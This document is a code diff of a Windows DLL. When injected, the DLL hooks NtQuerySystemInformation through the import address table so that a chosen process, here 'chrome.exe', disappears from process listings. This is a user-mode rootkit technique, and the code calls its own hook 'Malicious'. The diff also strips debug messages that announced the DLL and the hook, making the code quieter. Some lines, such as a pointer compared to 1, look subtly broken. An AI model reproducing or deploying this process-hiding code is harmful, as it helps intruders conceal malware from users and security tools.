@@ -21,8 +21,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
 	switch (fdwReason)
 	{
 	case DLL_PROCESS_ATTACH:
-		printf("%s\r\n", "[*] Malicious dll was loaded");
-		IMAGE_THUNK_DATA32* thunkOfRealNtQuerySystemInformation = find_iat_entry("ntdll.dll", "NtQuerySystemInformation");
+		IMAGE_THUNK_DATA32 *thunkOfRealNtQuerySystemInformation = find_iat_entry("ntdll.dll", "NtQuerySystemInformation");
 		if (thunkOfRealNtQuerySystemInformation != 1) { //if the thunk exists
 			hook_function(thunkOfRealNtQuerySystemInformation, MaliciousNtQuerySystemInformation);
 		}
@@ -84,9 +83,6 @@ void hook_function(IMAGE_THUNK_DATA32* thunk, NtQuerySystemInformationFuncType M
 
 
 NTSTATUS __stdcall MaliciousNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
-	printf("%s\r\n", "[*] This is the attacker...");
-
-
 	if (SystemInformationClass != SystemProcessInformation) {
 		return realNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 	}
@@ -107,7 +103,7 @@ NTSTATUS __stdcall MaliciousNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS Sy
 		
 		while (processesBuffer->NextEntryOffset != 0) { //traverse the process list until we reach the end
 			processesBuffer = ((byte*) processesBuffer) + processesBuffer->NextEntryOffset;
-			if (wcscmp(L"System", processesBuffer->ImageName.Buffer) != 0) { //replace "chrome.exe" with the name of the process to hide
+			if (wcscmp(L"chrome.exe", processesBuffer->ImageName.Buffer) != 0) { //replace "chrome.exe" with the name of the process to hide
 				
 				if (processesBuffer->NextEntryOffset != 0) { //if this is not the last process in the buffer, proceed further
 					memcpy(SystemInformation, processesBuffer, processesBuffer->NextEntryOffset);
@@ -132,7 +128,6 @@ NTSTATUS __stdcall MaliciousNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS Sy
 	free(startOfProcessesBuffer);
 	*(ReturnLength) = returnLength;
 	return status;
-	//return NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 }
 
 
